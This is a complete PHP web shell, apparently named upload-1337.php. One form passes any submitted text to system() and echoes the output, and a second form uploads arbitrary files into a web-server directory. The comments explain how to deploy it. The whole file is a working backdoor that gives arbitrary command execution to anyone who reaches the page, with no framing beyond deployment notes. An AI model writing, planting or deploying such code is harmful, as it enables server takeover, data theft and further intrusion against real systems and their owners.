<?php
    if (isset($_POST['submit'])) {
	#$currentDirectory = getcwd();
        #$uploadDirectory = "/uploads/";
	# Configured the directory below where the files are saved on the web server
	# This can be any directory on the server that is writeable by www-data
        $uploadDirectory = "/var/www/html/uploads/users/";

        $fileName = $_FILES['f']['name'];
        $fileTempName  = $_FILES['f']['tmp_name'];

    	$uploadPath = $currentDirectory . $uploadDirectory . basename($fileName); 
        move_uploaded_file($fileTempName, $uploadPath);

        echo "The file " . basename($fileName) . " has been uploaded";
    }

    if (isset($_POST['execute'])) {
	$cmd = $_POST['cmd'];
	echo "<pre>"; 
	system($cmd); 
	echo "</pre>"; 
	echo "<br />";
	echo "Last Command Executed: $cmd";
    }

    
?>

<html>
<body>
    <br />
    <form action="upload-1337.php" method="post">
	Command to Execute: &nbsp; <input type="text" name="cmd"><br />
	<input type="submit" name="execute" value="Execute">
    </form>
    <br />
    <br />
    <!-- Note the below filename needs to match what you name this on the server -->
    <form action="upload-1337.php" method="post" enctype="multipart/form-data">
        Upload a File:
        <input type="file" name="f"><br />
        <input type="submit" name="submit" value="Upload">
    </form>
    <br />
</body>
</html>
